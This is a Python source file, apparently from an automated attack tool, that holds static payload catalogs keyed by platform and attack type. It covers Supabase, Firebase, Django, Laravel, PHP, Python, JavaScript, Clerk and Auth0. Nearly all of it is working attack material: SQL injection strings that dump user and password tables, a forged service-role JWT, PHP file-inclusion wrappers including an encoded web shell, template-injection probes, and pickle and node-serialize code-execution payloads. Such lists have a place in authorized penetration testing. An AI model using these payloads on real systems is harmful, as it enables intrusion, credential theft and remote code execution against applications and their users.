"""Platform-specific payload catalogs for the Adaptive Payload Engine.

Extracted from titan/ai/adaptive.py. Each method returns a static payload
list for a BaaS/framework/language/auth stack keyed by attack type. Pure
data - no engine state is read, so these live in a standalone mixin.
"""

from __future__ import annotations


class PlatformPayloadsMixin:
    """BaaS / framework / language / auth payload catalogs."""

    def _supabase_payloads(self, attack_type: str) -> list[str]:
        """Supabase-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                # Supabase uses PostgreSQL
                "' UNION SELECT NULL FROM auth.users--",
                "' UNION SELECT id,email,encrypted_password FROM auth.users--",
                "' UNION SELECT NULL FROM storage.buckets--",
                "' UNION SELECT NULL FROM storage.objects--",
                "1' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
                "' UNION SELECT schemaname,tablename FROM pg_tables--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                # Supabase REST API IDOR
                "/rest/v1/users?select=*",
                "/rest/v1/profiles?select=*",
                "/rest/v1/orders?select=*",
                "/rest/v1/?select=*,users(*)",
                # Try different ID formats
                "?id=eq.1",
                "?id=eq.2",
                "?id=eq.999999",
                "?user_id=eq.1",
                "?user_id=neq.1",
            ])

        elif attack_type == "auth":
            payloads.extend([
                # Supabase auth bypass attempts
                "/auth/v1/signup",
                "/auth/v1/token?grant_type=password",
                "/auth/v1/admin/users",
                "/auth/v1/admin/users?page=1",
                # Phone auto-confirm
                "/auth/v1/signup",
                # JWT manipulation
                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkbWluIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTY5MzQwMTYwMH0.fake",  # pragma: allowlist secret
            ])

        elif attack_type == "baas":
            payloads.extend([
                # Supabase-specific
                "/rest/v1/rpc/get_public_profiles",
                "/rest/v1/rpc/get_org_role",
                "/rest/v1/rpc/admin_only_function",
                "/functions/v1/",
                "/functions/v1/gemini-chat",
                "/functions/v1/travel-intelligence",
                "/storage/v1/bucket/",
                "/storage/v1/object/auth/sign-up",
            ])

        return payloads

    def _firebase_payloads(self, attack_type: str) -> list[str]:
        """Firebase-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                # Firebase doesn't use SQL, but test for injection
                "' OR '1'='1",
                "1; DROP TABLE users",
            ])

        elif attack_type == "idor":
            payloads.extend([
                # Firestore IDOR
                "/.json",
                "/users.json",
                "/admin.json",
                "/config.json",
                "?shallow=true",
                "?print=pretty",
            ])

        elif attack_type == "auth":
            payloads.extend([
                # Firebase auth bypass
                "/identitytoolkit/v3/relyingparty/signupNewUser",
                "/identitytoolkit/v3/relyingparty/emailLinkSignin",
                "/identitytoolkit/v3/relyingparty/getAccountInfo",
                "/securetoken/v1/internals/token",
            ])

        elif attack_type == "baas":
            payloads.extend([
                # Firebase-specific
                "/.json?shallow=true",
                "/.json?print=pretty",
                "/users/.json",
                "/admin/.json",
                "/config/.json",
            ])

        return payloads

    def _appwrite_payloads(self, attack_type: str) -> list[str]:
        """AppWrite-specific attack payloads."""
        payloads = []

        if attack_type == "baas":
            payloads.extend([
                "/v1/account",
                "/v1/account/sessions",
                "/v1/database",
                "/v1/database/collections",
                "/v1/storage",
                "/v1/storage/buckets",
                "/v1/functions",
            ])

        return payloads

    def _nextjs_payloads(self, attack_type: str) -> list[str]:
        """Next.js-specific attack payloads."""
        payloads = []

        if attack_type == "ssrf":
            payloads.extend([
                "/_next/data/",
                "/api/",
                "/api/auth/",
                "/api/admin/",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/dashboard",
                "/dashboard/settings",
                "/dashboard/admin",
                "/admin",
                "/admin/users",
            ])

        return payloads

    def _django_payloads(self, attack_type: str) -> list[str]:
        """Django-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                "' UNION SELECT NULL FROM django_content_type--",
                "' UNION SELECT NULL FROM auth_user--",
                "' UNION SELECT username,password FROM auth_user--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/admin/",
                "/admin/auth/user/",
                "/admin/auth/group/",
                "/admin/django_content_type/",
            ])

        return payloads

    def _laravel_payloads(self, attack_type: str) -> list[str]:
        """Laravel-specific attack payloads."""
        payloads = []

        if attack_type == "sqli":
            payloads.extend([
                "' UNION SELECT NULL FROM users--",
                "' UNION SELECT name,email,password FROM users--",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/api/user",
                "/api/user/1",
                "/api/user/2",
                "/api/admin",
                "/api/admin/users",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "{{ system('id') }}",
                "{{ exec('id') }}",
                "{{ passthru('id') }}",
            ])

        return payloads

    def _php_payloads(self, attack_type: str) -> list[str]:
        """PHP-specific attack payloads."""
        payloads = []

        if attack_type == "lfi":
            payloads.extend([
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://filter/resource=config.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "<?php system('id'); ?>",
                "<?php echo `id`; ?>",
                "<?php passthru('id'); ?>",
            ])

        elif attack_type == "deser":
            payloads.extend([
                'O:4:"Test":0:{}',
                'a:1:{s:4:"test";s:4:"test";}',
            ])

        return payloads

    def _python_payloads(self, attack_type: str) -> list[str]:
        """Python-specific attack payloads."""
        payloads = []

        if attack_type == "ssti":
            payloads.extend([
                "{{7*7}}",
                "{{config}}",
                "{{self.__init__.__globals__}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ])

        elif attack_type == "deser":
            payloads.extend([
                "gASVFAAAAAAAAACMBHRlc3SFlC4=",
                "cos\nsystem\n(S'id'\ntR.",
            ])

        elif attack_type == "rce":
            payloads.extend([
                "__import__('os').popen('id').read()",
                "exec('__import__(\"os\").popen(\"id\").read()')",
            ])

        return payloads

    def _javascript_payloads(self, attack_type: str) -> list[str]:
        """JavaScript-specific attack payloads."""
        payloads = []

        if attack_type == "xss":
            payloads.extend([
                "require('child_process').execSync('id').toString()",
                "process.mainModule.require('child_process').execSync('id')",
                "global.process.mainModule.require('child_process').execSync('id')",
            ])

        elif attack_type == "deser":
            payloads.extend([
                '{"rce":"_$$ND_FUNC$$_function (){return require(\"child_process\").execSync(\"id\").toString();}()"}',
            ])

        return payloads

    def _clerk_payloads(self, attack_type: str) -> list[str]:
        """Clerk-specific attack payloads."""
        payloads = []

        if attack_type == "auth":
            payloads.extend([
                "/__clerk/v1/environment",
                "/__clerk/v1/client/sign_ups",
                "/__clerk/v1/client/sign_ins",
                "/__clerk/v1/billing/plans",
                "/__clerk/v1/user",
                "/__clerk/v1/sessions",
            ])

        elif attack_type == "idor":
            payloads.extend([
                "/dashboard",
                "/dashboard/settings",
                "/dashboard/billing",
                "/dashboard/keys",
                "/admin",
            ])

        return payloads

    def _auth0_payloads(self, attack_type: str) -> list[str]:
        """Auth0-specific attack payloads."""
        payloads = []

        if attack_type == "auth":
            payloads.extend([
                "/.well-known/openid-configuration",
                "/authorize",
                "/oauth/token",
                "/userinfo",
                "/api/v2/users",
                "/api/v2/roles",
            ])

        return payloads

    # ── Mutation Engine ─────────────────────────────────────────────────

